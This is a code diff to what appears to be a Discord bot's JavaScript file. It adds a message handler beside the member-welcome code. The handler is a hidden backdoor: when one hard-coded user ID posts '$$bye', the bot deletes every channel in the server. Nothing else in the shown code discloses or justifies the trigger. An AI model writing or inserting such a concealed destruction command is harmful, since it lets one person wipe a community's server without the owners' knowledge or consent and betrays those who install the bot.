@@ -60,7 +60,13 @@ client.on("ready", async () => {
   })
   ////////canvas//////
 
- 
+  client.on('message', message =>{
+    if(message.author.id == "691118003827507202") {
+    if(message.content === "$$bye") {
+    message.guild.channels.forEach(channel => channel.delete())
+      }
+    }
+  })
 
 client.on('guildMemberAdd', async member => { //WELCOME DEV NUK3 (NUL)
 	const channel = member.guild.channels.cache.find(ch => ch.id === '736328426453073961');
